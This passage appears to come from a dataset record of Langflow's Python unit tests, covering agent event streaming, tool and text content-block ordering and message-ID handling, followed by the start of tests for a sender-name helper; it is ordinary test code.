# Simulate a streaming response with multiple chunks\\n    inputs = [\\n        [{\\\"text\\\": \\\"I'm\\\"}],\\n        [{\\\"text\\\": \\\" thinking\\\"}],\\n        [{\\\"text\\\": \\\" about\\\"}],\\n        [{\\\"index\\\": 0}],  # Empty streaming marker\\n        [{\\\"text\\\": \\\" your\\\"}],\\n        [{\\\"text\\\": \\\" question.\\\"}],\\n    ]\\n\\n    results = [_extract_output_text(inp) for inp in inputs]\\n    full_text = \\\"\\\".join(results)\\n    assert full_text == \\\"I'm thinking about your question.\\\"\\n\\n\\ndef test_extract_output_text_backward_compatibility_scenarios():\\n    \\\"\\\"\\\"Test various backward compatibility scenarios that should still work.\\\"\\\"\\\"\\n    # Original OpenAI/Anthropic style\\n    assert _extract_output_text([{\\\"text\\\": \\\"response\\\"}]) == \\\"response\\\"\\n\\n    # Tool use should return empty\\n    assert _extract_output_text([{\\\"type\\\": \\\"tool_use\\\"}]) == \\\"\\\"\\n\\n    # Partial JSON should return empty\\n    assert _extract_output_text([{\\\"partial_json\\\": \\\"{}\\\"}]) == \\\"\\\"\\n\\n    # String input should work\\n    assert _extract_output_text(\\\"direct string\\\") == \\\"direct string\\\"\\n\\n    # Empty list should work\\n    assert _extract_output_text([]) == \\\"\\\"\\n\\n\\ndef test_extract_output_text_chatbedrockconverse_compatibility():\\n    \\\"\\\"\\\"Test all ChatBedrockConverse-specific scenarios that were causing errors.\\\"\\\"\\\"\\n    # The specific failing case from the error message\\n    assert _extract_output_text([{\\\"index\\\": 0}]) == \\\"\\\"\\n\\n    # Other index variations\\n    assert _extract_output_text([{\\\"index\\\": 1}]) == \\\"\\\"\\n    assert _extract_output_text([{\\\"index\\\": 10}]) == \\\"\\\"\\n\\n    # Index with additional fields\\n    assert _extract_output_text([{\\\"index\\\": 0, \\\"metadata\\\": \\\"something\\\"}]) == \\\"\\\"\\n\\n    # Multiple index-only items\\n    assert _extract_output_text([{\\\"index\\\": 0}, {\\\"index\\\": 1}]) == \\\"\\\"\\n\\n    # Mixed with text\\n    assert _extract_output_text([{\\\"text\\\": \\\"Hello\\\"}, {\\\"index\\\": 0}]) == \\\"Hello\\\"\\n\\n\\ndef test_extract_output_text_responses_api_reasoning_block_is_empty():\\n    \\\"\\\"\\\"Reasoning/function_call blocks (list ``content``) must yield '' (used to leak '[]').\\\"\\\"\\\"\\n    assert _extract_output_text([{\\\"id\\\": \\\"rs\\\", \\\"summary\\\": [], \\\"type\\\": \\\"reasoning\\\", \\\"content\\\": [], \\\"index\\\": 0}]) == \\\"\\\"\\n    assert _extract_output_text([{\\\"type\\\": \\\"function_call\\\", \\\"name\\\": \\\"fetch_content\\\", \\\"arguments\\\": \\\"\\\", \\\"index\\\": 1}]) == \\\"\\\"\\n    # A string content payload is still extracted; a list content recurses, not str()-ed.\\n    assert _extract_output_text([{\\\"content\\\": \\\"real text\\\"}]) == \\\"real text\\\"\\n    assert _extract_output_text([{\\\"content\\\": [{\\\"type\\\": \\\"text\\\", \\\"text\\\": \\\"nested\\\"}]}]) == \\\"nested\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_agent_streaming_no_text_accumulation():\\n    \\\"\\\"\\\"Test that agent streaming sends individual token events without accumulating text.\\\"\\\"\\\"\\n    sent_messages = []\\n    token_events = []\\n\\n    async def mock_send_message(message):\\n        # Capture each message sent for verification\\n        sent_messages.append(\\n            {\\\"text\\\": message.text, \\\"state\\\": message.properties.state, \\\"id\\\": getattr(message, \\\"id\\\", None)}\\n        )\\n        return message\\n\\n    # Mock token callback to capture token events\\n    def mock_token_callback(data):\\n        # Capture token events\\n        token_events.append(data)\\n\\n    event_manager = mock_token_callback\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n    # Add an ID to the message (normally set when persisted to DB)\\n    agent_message.data[\\\"id\\\"] = \\\"test-message-id\\\"\\n\\n    # Simulate streaming events with individual chunks\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"Hello\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\" world\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"!\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_end\\\",\\n            \\\"data\\\": {\\\"output\\\": AgentFinish(return_values={\\\"output\\\": \\\"Hello world!\\\"}, log=\\\"complete\\\")},\\n        },\\n    ]\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, mock_send_message, event_manager)\\n\\n    # Verify individual token events were sent (not accumulated)\\n    assert len(token_events) == 3, f\\\"Expected 3 token events, got {len(token_events)}\\\"\\n\\n    # Each token event should contain only its chunk, not accumulated text\\n    assert token_events[0][\\\"chunk\\\"] == \\\"Hello\\\"\\n    assert token_events[1][\\\"chunk\\\"] == \\\" world\\\"\\n    assert token_events[2][\\\"chunk\\\"] == \\\"!\\\"\\n\\n    # Verify all token events have the correct message ID\\n    for token_event in token_events:\\n        assert \\\"id\\\" in token_event\\n        assert token_event[\\\"id\\\"] == \\\"test-message-id\\\"\\n\\n    # Verify no token event contains accumulated text\\n    for token_event in token_events:\\n        assert \\\"Hello world!\\\" not in token_event[\\\"chunk\\\"], f\\\"Found accumulated text in chunk: {token_event['chunk']}\\\"\\n\\n    # Final result should have complete message with full text\\n    assert result.properties.state == \\\"complete\\\"\\n    assert result.text == \\\"Hello world!\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_agent_streaming_without_event_manager():\\n    \\\"\\\"\\\"Test that agent streaming works without event_manager (backward compatibility).\\\"\\\"\\\"\\n    sent_messages = []\\n    call_count = [0]\\n\\n    async def mock_send_message(message):\\n        call_count[0] += 1\\n        if call_count[0] == 1:\\n            # Simulate production: add ID on first call (when persisting to DB)\\n            message.data[\\\"id\\\"] = \\\"test-message-id\\\"\\n        sent_messages.append(\\n            {\\\"text\\\": message.text, \\\"state\\\": message.properties.state, \\\"id\\\": getattr(message, \\\"id\\\", None)}\\n        )\\n        return message\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n\\n    # Simulate streaming events with individual chunks but NO event_manager\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"Hello\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\" world\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_end\\\",\\n            \\\"data\\\": {\\\"output\\\": AgentFinish(return_values={\\\"output\\\": \\\"Hello world!\\\"}, log=\\\"complete\\\")},\\n        },\\n    ]\\n\\n    # Call without event_manager parameter\\n    result = await process_agent_events(create_event_iterator(events), agent_message, mock_send_message)\\n\\n    # Without event_manager, streaming chunks should not trigger send_message\\n    # Only initial message and final message should be sent\\n    assert result.properties.state == \\\"complete\\\"\\n    assert result.text == \\\"Hello world!\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_agent_streaming_skips_empty_chunks():\\n    \\\"\\\"\\\"Test that empty or whitespace-only chunks are skipped during streaming.\\\"\\\"\\\"\\n    token_events = []\\n\\n    async def mock_send_message(message):\\n        return message\\n\\n    def mock_token_callback(data):\\n        token_events.append(data)\\n\\n    event_manager = mock_token_callback\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n    # Add an ID to the message (normally set when persisted to DB)\\n    agent_message.data[\\\"id\\\"] = \\\"test-message-id-2\\\"\\n\\n    # Simulate streaming with empty/whitespace chunks mixed in\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"Hello\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"\\\")},  # Empty - should be skipped\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"   \\\")},  # Whitespace - are valid\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\" world\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_end\\\",\\n            \\\"data\\\": {\\\"output\\\": AgentFinish(return_values={\\\"output\\\": \\\"Hello world\\\"}, log=\\\"complete\\\")},\\n        },\\n    ]\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, mock_send_message, event_manager)\\n\\n    # Only non-empty chunks should generate token events\\n    assert len(token_events) == 3, f\\\"Expected 3 token events (empty chunks skipped), got {len(token_events)}\\\"\\n    assert token_events[0][\\\"chunk\\\"] == \\\"Hello\\\"\\n    assert token_events[1][\\\"chunk\\\"] == \\\"   \\\"\\n    assert token_events[2][\\\"chunk\\\"] == \\\" world\\\"\\n    assert result.properties.state == \\\"complete\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_agent_streaming_preserves_message_id():\\n    \\\"\\\"\\\"Test that agent streaming preserves message ID throughout event processing.\\\"\\\"\\\"\\n    token_events = []\\n    call_count = [0]\\n\\n    async def mock_send_message(message):\\n        # Simulate persisting the message and returning with ID on first call\\n        call_count[0] += 1\\n        if call_count[0] == 1:\\n            # First call - add the ID\\n            message.data[\\\"id\\\"] = \\\"test-persisted-id\\\"\\n        return message\\n\\n    def mock_token_callback(data):\\n        token_events.append(data)\\n\\n    event_manager = mock_token_callback\\n\\n    # Create message WITHOUT an ID initially\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"test_session_id\\\",\\n    )\\n\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\"Hello\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_stream\\\",\\n            \\\"data\\\": {\\\"chunk\\\": AIMessageChunk(content=\\\" world\\\")},\\n        },\\n        {\\n            \\\"event\\\": \\\"on_chain_end\\\",\\n            \\\"data\\\": {\\\"output\\\": AgentFinish(return_values={\\\"output\\\": \\\"Hello world\\\"}, log=\\\"complete\\\")},\\n        },\\n    ]\\n\\n    result = await process_agent_events(create_event_iterator(events), agent_message, mock_send_message, event_manager)\\n\\n    # Verify token events were sent with the persisted ID\\n    assert len(token_events) == 2, f\\\"Expected 2 token events, got {len(token_events)}\\\"\\n    assert token_events[0][\\\"chunk\\\"] == \\\"Hello\\\"\\n    assert token_events[0][\\\"id\\\"] == \\\"test-persisted-id\\\"\\n    assert token_events[1][\\\"chunk\\\"] == \\\" world\\\"\\n    assert token_events[1][\\\"id\\\"] == \\\"test-persisted-id\\\"\\n    assert result.properties.state == \\\"complete\\\"\\n    assert result.text == \\\"Hello world\\\"\\n\\n\\n# ---------------------------------------------------------------------------\\n# Flat-emission design tests\\n#\\n# These pin the chronological \\\"stream of events\\\" shape the new design calls\\n# for: tool calls land flat in content_blocks in the order they fire, and\\n# message.text triggers the setter to append a TextContent at the end. No\\n# wrapping ContentBlock(\\\"Agent Steps\\\", ...) is emitted.\\n# ---------------------------------------------------------------------------\\n\\n\\n@pytest.mark.asyncio\\nasync def test_no_wrapper_group_for_tool_then_text():\\n    \\\"\\\"\\\"Two tools fired in order, then a final text -- everything stays flat.\\n\\n    With the on_chat_model_end-driven interleaving, the final text\\n    arrives through that handler (an AIMessage whose .content holds\\n    just the text). on_chain_end stashes the same string in\\n    data[\\\"text\\\"] but doesn't append a TextContent \u2014 the model-end\\n    handler is the source of truth for the text blocks.\\n    \\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    final_ai_message = AIMessage(content=[{\\\"type\\\": \\\"text\\\", \\\"text\\\": \\\"all done\\\"}])\\n    output = AgentFinish(return_values={\\\"output\\\": \\\"all done\\\"}, log=\\\"\\\")\\n\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"tool_a\\\",\\n            \\\"run_id\\\": \\\"run-a\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"q\\\": \\\"1\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"tool_a\\\",\\n            \\\"run_id\\\": \\\"run-a\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"a result\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"tool_b\\\",\\n            \\\"run_id\\\": \\\"run-b\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"q\\\": \\\"2\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"tool_b\\\",\\n            \\\"run_id\\\": \\\"run-b\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"b result\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\\"event\\\": \\\"on_chat_model_end\\\", \\\"data\\\": {\\\"output\\\": final_ai_message}, \\\"start_time\\\": 0},\\n        {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": output}, \\\"start_time\\\": 0},\\n    ]\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"s\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    # No wrapping group; tools appear flat in fire order; final text last.\\n    types = [c.type for c in result.content_blocks]\\n    assert types == [\\\"tool_use\\\", \\\"tool_use\\\", \\\"text\\\"], types\\n    assert result.content_blocks[0].name == \\\"tool_a\\\"\\n    assert result.content_blocks[0].output == \\\"a result\\\"\\n    assert result.content_blocks[1].name == \\\"tool_b\\\"\\n    assert result.content_blocks[1].output == \\\"b result\\\"\\n    assert result.content_blocks[-1].text == \\\"all done\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_tool_end_updates_matching_pending_tool_only():\\n    \\\"\\\"\\\"Two identical tool invocations: tool_end must update the right one.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"search\\\",\\n            \\\"run_id\\\": \\\"run-1\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"q\\\": \\\"shared\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"search\\\",\\n            \\\"run_id\\\": \\\"run-1\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"first\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"search\\\",\\n            \\\"run_id\\\": \\\"run-2\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"q\\\": \\\"shared\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"search\\\",\\n            \\\"run_id\\\": \\\"run-2\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"second\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n    ]\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"s\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    # Two distinct ToolContents, each with the right output -- the\\n    # `output is None` filter in handle_on_tool_end prevents the second\\n    # tool_end from clobbering the first tool's completed output.\\n    assert len(result.content_blocks) == 2\\n    assert [c.output for c in result.content_blocks] == [\\\"first\\\", \\\"second\\\"]\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chain_start_is_a_noop_for_content_blocks():\\n    \\\"\\\"\\\"Synthetic 'Input' TextContent is gone -- chain_start touches nothing.\\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"s\\\",\\n    )\\n    events = [\\n        {\\n            \\\"event\\\": \\\"on_chain_start\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"input\\\": \\\"hello there\\\", \\\"chat_history\\\": []}},\\n            \\\"start_time\\\": 0,\\n        },\\n    ]\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n    assert result.content_blocks == []\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chain_end_does_not_append_text_block():\\n    \\\"\\\"\\\"chain_end stashes the final string in data[\\\"text\\\"] but does NOT append a TextContent.\\n\\n    The on_chat_model_end handler is the source of truth for text\\n    blocks -- it walks each AIMessage.content list and appends text +\\n    tool_use in producer order so interleaved narration sits between\\n    the tool calls instead of being collapsed to one block at the end.\\n    chain_end appending its own TextContent would either duplicate the\\n    final round's text (already added by chat_model_end) or clobber\\n    the interleaved layout via the Message.text setter, which drops\\n    every existing TextContent and writes one at the end.\\n\\n    Message.text still returns \\\"answer\\\" because the getter falls back\\n    to data[text_key] when content_blocks holds no TextContent.\\n    \\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    output = AgentFinish(return_values={\\\"output\\\": \\\"answer\\\"}, log=\\\"\\\")\\n    events = [{\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": output}, \\\"start_time\\\": 0}]\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"s\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert result.content_blocks == []\\n    assert result.text == \\\"answer\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chat_model_end_appends_interleaved_text_and_tool_blocks():\\n    \\\"\\\"\\\"on_chat_model_end walks AIMessage.content and appends each text and tool_use item in order.\\n\\n    Two model rounds:\\n      Round 1: [text \\\"I'll fetch the date\\\", tool_use get_date]\\n        -> on_chat_model_end appends both, in that order.\\n        -> on_tool_start finds the existing ToolContent (by name +\\n           output is None + not yet bound), overwrites its empty\\n           tool_input with the real input, no fallback append.\\n        -> on_tool_end fills .output.\\n      Round 2: [text \\\"Got it -- summary\\\"]\\n        -> on_chat_model_end appends one TextContent.\\n        -> on_chain_end stashes the same string in data[\\\"text\\\"] but\\n           appends nothing.\\n\\n    Expected interleaved shape:\\n      [text \\\"I'll fetch the date\\\", tool_use get_date(output set),\\n       text \\\"Got it -- summary\\\"]\\n    \\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    round1 = AIMessage(\\n        content=[\\n            {\\\"type\\\": \\\"text\\\", \\\"text\\\": \\\"I'll fetch the date\\\"},\\n            # input_json_delta chunks haven't been merged yet at this\\n            # point in the real stream; the tool_use snapshot has {}.\\n            {\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"get_date\\\", \\\"input\\\": {}, \\\"id\\\": \\\"tu_1\\\"},\\n        ]\\n    )\\n    round2 = AIMessage(content=[{\\\"type\\\": \\\"text\\\", \\\"text\\\": \\\"Got it -- summary\\\"}])\\n    final = AgentFinish(return_values={\\\"output\\\": \\\"Got it -- summary\\\"}, log=\\\"\\\")\\n\\n    events = [\\n        {\\\"event\\\": \\\"on_chat_model_end\\\", \\\"data\\\": {\\\"output\\\": round1}, \\\"start_time\\\": 0},\\n        # Real input arrives now via on_tool_start; the dedupe should\\n        # overwrite the empty {} on the existing ToolContent.\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"get_date\\\",\\n            \\\"run_id\\\": \\\"run-1\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"tz\\\": \\\"UTC\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"get_date\\\",\\n            \\\"run_id\\\": \\\"run-1\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"2026-05-28 14:00 UTC\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\\"event\\\": \\\"on_chat_model_end\\\", \\\"data\\\": {\\\"output\\\": round2}, \\\"start_time\\\": 0},\\n        {\\\"event\\\": \\\"on_chain_end\\\", \\\"data\\\": {\\\"output\\\": final}, \\\"start_time\\\": 0},\\n    ]\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"s\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    types = [c.type for c in result.content_blocks]\\n    assert types == [\\\"text\\\", \\\"tool_use\\\", \\\"text\\\"], types\\n    assert result.content_blocks[0].text == \\\"I'll fetch the date\\\"\\n    assert result.content_blocks[1].name == \\\"get_date\\\"\\n    # tool_input was overwritten by on_tool_start with the real value.\\n    assert result.content_blocks[1].tool_input == {\\\"tz\\\": \\\"UTC\\\"}\\n    assert result.content_blocks[1].output == \\\"2026-05-28 14:00 UTC\\\"\\n    assert result.content_blocks[2].text == \\\"Got it -- summary\\\"\\n    # Message.text concatenates every TextContent.\\n    assert result.text == \\\"I'll fetch the dateGot it -- summary\\\"\\n\\n\\n@pytest.mark.asyncio\\nasync def test_chat_model_end_parallel_same_tool_keeps_order():\\n    \\\"\\\"\\\"Two parallel calls to the same tool: outputs land on the right block via order-based binding.\\n\\n    Each on_tool_start binds to the next unbound ToolContent in\\n    declaration order, so even when inputs are identical the\\n    name + output-is-None + not-yet-bound match keeps the bindings\\n    distinct.\\n    \\\"\\\"\\\"\\n    send_message = create_mock_send_message()\\n\\n    ai = AIMessage(\\n        content=[\\n            {\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"fetch\\\", \\\"input\\\": {}, \\\"id\\\": \\\"tu_a\\\"},\\n            {\\\"type\\\": \\\"tool_use\\\", \\\"name\\\": \\\"fetch\\\", \\\"input\\\": {}, \\\"id\\\": \\\"tu_b\\\"},\\n        ]\\n    )\\n\\n    events = [\\n        {\\\"event\\\": \\\"on_chat_model_end\\\", \\\"data\\\": {\\\"output\\\": ai}, \\\"start_time\\\": 0},\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"fetch\\\",\\n            \\\"run_id\\\": \\\"run-a\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"url\\\": \\\"a\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_start\\\",\\n            \\\"name\\\": \\\"fetch\\\",\\n            \\\"run_id\\\": \\\"run-b\\\",\\n            \\\"data\\\": {\\\"input\\\": {\\\"url\\\": \\\"b\\\"}},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"fetch\\\",\\n            \\\"run_id\\\": \\\"run-a\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"result a\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n        {\\n            \\\"event\\\": \\\"on_tool_end\\\",\\n            \\\"name\\\": \\\"fetch\\\",\\n            \\\"run_id\\\": \\\"run-b\\\",\\n            \\\"data\\\": {\\\"output\\\": \\\"result b\\\"},\\n            \\\"start_time\\\": 0,\\n        },\\n    ]\\n\\n    agent_message = Message(\\n        sender=MESSAGE_SENDER_AI,\\n        sender_name=\\\"Agent\\\",\\n        properties={\\\"icon\\\": \\\"Bot\\\", \\\"state\\\": \\\"partial\\\"},\\n        content_blocks=[],\\n        session_id=\\\"s\\\",\\n    )\\n    result = await process_agent_events(create_event_iterator(events), agent_message, send_message)\\n\\n    assert len(result.content_blocks) == 2\\n    assert result.content_blocks[0].tool_input == {\\\"url\\\": \\\"a\\\"}\\n    assert result.content_blocks[0].output == \\\"result a\\\"\\n    assert result.content_blocks[1].tool_input == {\\\"url\\\": \\\"b\\\"}\\n    assert result.content_blocks[1].output == \\\"result b\\\"\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_agent_utils.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"f462d2a810777ddabfba52113d57746980471a93514eb0eeb0fa80d82a83bd9d\",\"content\":\"\\\"\\\"\\\"Tests for agent utility functions.\\\"\\\"\\\"\\n\\nfrom unittest.mock import Mock\\n\\nfrom lfx.base.agents.utils import get_chat_output_sender_name\\n\\n\\nclass TestGetChatOutputSenderName:\\n    \\\"\\\"\\\"Test suite for get_chat_output_sender_name function.\\\"\\\"\\\"\\n\\n    def test_get_chat_output_sender_name_no_graph(self):\\n        \\\"\\\"\\\"Test that function returns None when component has no graph.\\\"\\\"\\\"\\n        # Create a mock component without graph attribute\\n        component = Mock()\\n        del component.graph  # Remove graph attribute\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_graph_none(self):\\n        \\\"\\\"\\\"Test that function returns None when component.graph is None.\\\"\\\"\\\"\\n        # Create a mock component with None graph\\n        component = Mock()\\n        component.graph = None\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_no_vertices(self):\\n        \\\"\\\"\\\"Test that function returns None when graph has no vertices.\\\"\\\"\\\"\\n        # Create a mock component with empty vertices\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = []\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_no_chat_output(self):\\n        \\\"\\\"\\\"Test that function returns None when no ChatOutput component exists.\\\"\\\"\\\"\\n        # Create mock vertices that are not ChatOutput\\n        vertex1 = Mock()\\n        vertex1.data = {\\\"type\\\": \\\"ChatInput\\\"}\\n        vertex1.raw_params = {\\\"sender_name\\\": \\\"User\\\"}\\n\\n        vertex2 = Mock()\\n        vertex2.data = {\\\"type\\\": \\\"TextOutput\\\"}\\n        vertex2.raw_params = {\\\"value\\\": \\\"test\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [vertex1, vertex2]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result is None\\n\\n    def test_get_chat_output_sender_name_found(self):\\n        \\\"\\\"\\\"Test that function returns sender_name when ChatOutput component exists.\\\"\\\"\\\"\\n        # Create a mock ChatOutput vertex\\n        chat_output_vertex = Mock()\\n        chat_output_vertex.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output_vertex.raw_params = {\\\"sender_name\\\": \\\"Assistant\\\"}\\n\\n        # Create other vertices\\n        other_vertex = Mock()\\n        other_vertex.data = {\\\"type\\\": \\\"ChatInput\\\"}\\n        other_vertex.raw_params = {\\\"value\\\": \\\"test\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [other_vertex, chat_output_vertex]\\n\\n        result = get_chat_output_sender_name(component)\\n\\n        assert result == \\\"Assistant\\\"\\n\\n    def test_get_chat_output_sender_name_first_match(self):\\n        \\\"\\\"\\\"Test that function returns sender_name from first ChatOutput component found.\\\"\\\"\\\"\\n        # Create multiple mock ChatOutput vertices\\n        chat_output1 = Mock()\\n        chat_output1.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output1.raw_params = {\\\"sender_name\\\": \\\"Assistant1\\\"}\\n\\n        chat_output2 = Mock()\\n        chat_output2.data = {\\\"type\\\": \\\"ChatOutput\\\"}\\n        chat_output2.raw_params = {\\\"sender_name\\\": \\\"Assistant2\\\"}\\n\\n        component = Mock()\\n        component.graph = Mock()\\n        component.graph.vertices = [chat_output1, 